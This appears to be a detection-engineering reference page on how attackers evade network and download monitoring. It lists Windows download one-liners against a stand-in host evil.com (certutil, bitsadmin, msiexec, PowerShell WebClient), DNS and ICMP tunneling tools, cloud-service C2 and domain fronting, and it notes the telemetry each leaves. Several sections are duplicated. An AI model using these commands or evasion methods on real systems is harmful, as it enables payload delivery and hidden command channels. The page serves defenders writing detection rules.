# Network & Download Evasion

Detection rules monitoring network activity and file downloads often focus on specific tools or protocols. Attackers exploit alternative download methods, protocol abuse, and infrastructure blending to evade these rules. Relevant to ADE2-01 (Omit Alternatives) and ADE2-04 (Alternate Protocol/Channel).

## Alternative Download Methods

Each download method produces different process creation and network telemetry:

- **certutil.exe**: `certutil -urlcache -split -f http://evil.com/payload out.exe`. Also `-verifyctl` with custom URL. Process creation event shows certutil.exe with URL in command line. User-Agent: `CertUtil URL Agent`.
- **bitsadmin.exe**: `bitsadmin /transfer job http://evil.com/payload C:\out.exe`. Background transfer survives reboots. Multi-step creation (`/create`, `/addfile`, `/resume`) splits telemetry across multiple command lines.
- **curl.exe**: Native on Windows 10 1803+. `curl -o out.exe http://evil.com/payload`. Standard User-Agent. Rules targeting only PowerShell downloads miss this.
- **PowerShell WebClient**: `(New-Object Net.WebClient).DownloadFile('http://evil.com/payload','out.exe')`. Also `DownloadString` for in-memory execution. `.DownloadData()` returns byte array.
- **PowerShell Invoke-WebRequest**: `iwr http://evil.com/payload -OutFile out.exe`. Alias: `wget`, `curl` in PowerShell (these are aliases, not the real binaries).
- **.NET HttpClient**: `[System.Net.Http.HttpClient]::new().GetByteArrayAsync('http://evil.com/payload')`. Lower-level .NET class, appears in ScriptBlock logs but not as a recognizable cmdlet.
- **COM XmlHttp**: `$x = New-Object -ComObject Msxml2.XMLHTTP; $x.Open('GET','http://evil.com/payload',$false); $x.Send()`. Uses COM, different code path than WebClient.
- **Start-BitsTransfer**: PowerShell BITS cmdlet. `Start-BitsTransfer -Source http://evil.com/payload -Destination out.exe`.
- **esentutl.exe**: `esentutl /y \\webdav.evil.com\share\payload /d out.exe /o`. Uses WebDAV, not HTTP directly. Different network signature.
- **Excel/Word macros**: `URLDownloadToFile` API call from VBA macros. Process creation shows Office application, not a download tool.
- **msiexec.exe**: `msiexec /q /i http://evil.com/payload.msi`. Downloads and executes MSI package. Network traffic shows MSI download.
- **MpCmdRun.exe**: `MpCmdRun.exe -DownloadFile -url URL -path FILE` (Defender binary)
- **desktopimgdownldr**: Uses COM objects for download
- **esentutl.exe**: `esentutl.exe /y URL /d FILE /o` — Extensible Storage Engine utility
- **GfxDownloadWrapper.exe**: Intel graphics component
- **msedge.exe / chrome.exe**: `--headless --dump-dom URL`
- **Excel/Word macros**: URLDownloadToFile, WinHttpRequest, XMLHTTP
- **.NET WebClient**: System.Net.WebClient via any .NET host
- **COM objects**: WinHttp.WinHttpRequest.5.1, Msxml2.XMLHTTP


## DNS Tunneling

Data exfiltration and C2 communication over DNS queries, often bypassing network monitoring:

- **dnscat2**: Full TCP tunnel over DNS. Encodes data in DNS TXT, CNAME, MX, or A record queries. Server-side component decodes. Detectable via high-volume DNS queries to a single domain and unusual query types.
- **iodine**: IP-over-DNS tunnel. Encodes IP traffic in DNS queries. Uses NULL, TXT, CNAME, or MX records. Produces abnormally long subdomain labels.
- **dns2tcp**: TCP-over-DNS tunnel. Client connects via DNS queries to a controlled authoritative server.
- **Detection indicators**: Unusually long subdomain names (>50 chars), high query volume to a single domain, unusual record types (TXT, NULL), periodic query patterns.

## Protocol Abuse

Using legitimate protocols for unintended data transfer:

- **DNS over HTTPS (DoH)**: DNS queries sent as HTTPS traffic to resolvers (1.1.1.1, 8.8.8.8). Encrypted, bypasses DNS monitoring. Malware families increasingly use DoH.
- **ICMP tunneling**: Data encoded in ICMP echo request/reply payloads. Tools: icmpsh, ptunnel. Bypasses firewalls allowing ping.
- **SMTP exfiltration**: Data sent as email content or attachments through legitimate mail servers. Blends with normal email traffic.
- **WebSocket abuse**: Upgrading HTTP to WebSocket connections for persistent, bidirectional C2. WebSocket traffic after initial upgrade is not inspected by many HTTP proxies.
- **SSH tunneling**: SSH port forwarding (`-L`, `-R`, `-D` flags) creates encrypted tunnels that bypass application-layer inspection.
- **DoH (DNS over HTTPS)**: Bypass DNS monitoring entirely
- **WebSocket**: Upgrade from HTTP, persistent bidirectional
- **gRPC/HTTP2**: Binary protocol, harder to inspect
- **Cloud service API**: S3, Azure Blob, GCS as C2 channels

## Proxy-Aware vs Non-Proxy-Aware Gaps

Many organizations force web traffic through proxies. Detection rules may monitor only proxied traffic:

- **Proxy-aware tools**: Browsers, PowerShell WebClient (uses IE proxy settings), curl with `--proxy`. Traffic visible to proxy inspection.
- **Non-proxy-aware tools**: Raw socket connections, some compiled C2 agents, direct syscall-based downloaders. Traffic bypasses proxy, invisible to proxy-based detection but visible to network TAPs.
- **WinHTTP vs WinInet**: WinHTTP uses system proxy settings, WinInet uses per-user IE settings. Different proxy configurations may route traffic differently
- **BITS jobs**: Background Intelligent Transfer Service — respects proxy, resumes
- **WebClient service**: WebDAV — maps remote share as local drive
- **WinHTTP**: Uses system proxy settings automatically

## Cloud Storage and Legitimate Service Abuse

Using trusted cloud services as C2 infrastructure or staging:

- **S3 presigned URLs**: Time-limited download URLs from AWS S3. Domain is amazonaws.com -- typically allowlisted.
- **Azure Blob Storage**: `*.blob.core.windows.net` URLs for payload hosting. Trusted domain.
- **Google Cloud Storage / Firebase**: `storage.googleapis.com` for payload delivery.
- **GitHub/GitLab raw content**: `raw.githubusercontent.com` for payload hosting. Frequently allowlisted for developer tools.
- **Pastebin/Hastebin/paste.ee**: Text-sharing services for script staging. Known pattern but new paste services emerge constantly.
- **CDN abuse**: Cloudflare Workers, AWS CloudFront, Azure CDN for C2 relaying. Traffic appears as CDN communication.
- **Slack/Discord/Telegram APIs**: C2 communication through legitimate messaging service APIs. Traffic blends with normal business communication.

## User-Agent and TLS Evasion

- **User-Agent manipulation**: C2 frameworks set User-Agent to match common browsers (`Mozilla/5.0 Chrome/...`) or legitimate tools. Rules matching specific User-Agents (e.g., `python-requests`) are trivially bypassed.
- **JA3/JA3S fingerprinting evasion**: TLS client fingerprints identify C2 frameworks. Evasion: using legitimate TLS libraries, randomizing cipher suite order, or using JARM-resistant configurations.
- **Domain fronting**: HTTPS request with one domain in SNI (trusted) and a different domain in the Host header (C2). Traffic appears destined for the trusted domain at the network layer. Partially mitigated by major CDN providers.
- **Certificate pinning abuse**: C2 using legitimate certificates from cloud providers. Certificate-based detection must account for shared hosting.

## Protocol Abuse

- **DNS tunneling**: Encode data in DNS queries (txt records, CNAME)
- **ICMP tunneling**: Data in ICMP echo payloads
- **DoH (DNS over HTTPS)**: Bypass DNS monitoring entirely
- **WebSocket**: Upgrade from HTTP, persistent bidirectional
- **gRPC/HTTP2**: Binary protocol, harder to inspect
- **Cloud service API**: S3, Azure Blob, GCS as C2 channels